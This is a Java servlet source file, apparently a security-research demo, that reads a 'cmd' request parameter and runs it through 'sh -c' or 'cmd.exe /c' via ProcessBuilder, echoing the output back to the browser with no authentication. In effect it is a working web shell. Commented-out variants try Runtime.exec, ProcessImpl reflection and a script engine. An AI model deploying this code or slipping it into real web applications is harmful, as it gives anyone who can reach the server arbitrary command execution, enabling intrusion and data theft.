package com.pacemrc.javaweb.jsp;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;

/**
 * 利用tomcat的servlet回显命令执行结果的demo
 * 测试链接：http://localhost:8080/javaweb/TomcatEchoServlet?cmd=whoami
 */
@WebServlet(name = "TomcatEchoServlet", value = "/TomcatEchoServlet")
public class TomcatEchoServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        response.setContentType("text/html");


        String name = System.getProperty("os.name");
        String cmd = request.getParameter("cmd");
        String[] cmds = name != null && name.toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"sh", "-c", cmd};

        //1.测试Runtime命令执行
//        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();

        //2.测试ProcessBuilder命令执行
        InputStream in = new ProcessBuilder(cmds).start().getInputStream();
        //3.测试Processlmpl类反射命令执行（未成功）
//        Class clazz = null;
//        try {
//            clazz = Class.forName("java.lang.ProcessImpl");
//            Method start = clazz.getDeclaredMethod("start",String[].class, Map.class,String.class,ProcessBuilder.Redirect[].class,boolean.class);
//            start.setAccessible(true);
//            start.invoke(null,cmds,null,null,null,false);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
        //4.测试ScriptEngineManager.eval命令执行(未成功)
//        try {
//            new ScriptEngineManager().getEngineByExtension("js").eval().getInputStream();
//        } catch (ScriptException e) {
//            e.printStackTrace();
//        }

        byte[] buf = new byte[1024];
        int len = 0;
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        while ((len = in.read(buf)) != -1) {
            out.write(buf, 0, len);
        }
        PrintWriter writer = response.getWriter();
        writer.write(new String(out.toByteArray()));
        writer.flush();
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        doGet(request,response);
    }
}

